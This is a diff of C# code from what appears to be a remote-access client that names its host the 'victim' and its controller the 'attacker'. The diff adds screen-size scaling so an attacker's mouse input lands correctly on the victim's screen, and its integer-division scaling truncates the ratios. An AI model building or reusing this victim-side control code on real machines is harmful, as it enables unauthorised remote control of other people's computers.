@@ -1,6 +1,9 @@
 ﻿using Newtonsoft.Json.Linq;
 using Newtonsoft.Json;
 using System;
+using System.Drawing;
+using System.Windows.Forms;
+using System.Windows.Interop;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -12,6 +15,7 @@ using System.Windows;
 using System.Net;
 using System.Net.Sockets;
 using OpenCvSharp;
+using System.Runtime.InteropServices;
 
 namespace ExtremLink_Client_v2.Classes
 {
@@ -27,6 +31,16 @@ namespace ExtremLink_Client_v2.Classes
         // Integer constants which represent the sockets' ports:
         public readonly int VICTIM_TCP_PORT = 1847;
         public readonly int VICTIM_UDP_PORT = 1848;
+
+        // Import GetSystemMetrics from user32.dll
+        [DllImport("user32.dll")]
+        private static extern int GetSystemMetrics(int nIndex);
+
+
+        // The screen size:
+        private int screenWidth = GetSystemMetrics(0);
+        private int screenHeight = GetSystemMetrics(1);
+
 
         // A string which represent the attacker's IP address:
         private string attackerIpAddr;
@@ -270,11 +284,14 @@ namespace ExtremLink_Client_v2.Classes
 
             // Casting the data dynamic object to JObject
             JObject jsonData = (JObject)data;
+            
+            int screenWidthRatio = this.screenWidth / 800;
+            int screenHeightRatio = this.screenHeight / 450;
 
             // Checking if changing position is needed
             if (jsonData.ContainsKey("x") && jsonData.ContainsKey("y"))
             {
-                CustomMouseVictim.CustomMouseInstance.ChangePosition((float)data.x, (float)data.y);
+                CustomMouseVictim.CustomMouseInstance.ChangePosition((float)data.x * screenWidthRatio, (float)data.y * screenHeightRatio);
             }
 
             // Updating the mouse parameters according to the given message
@@ -529,3 +546,5 @@ namespace ExtremLink_Client_v2.Classes
         */
     }
 }
+
+
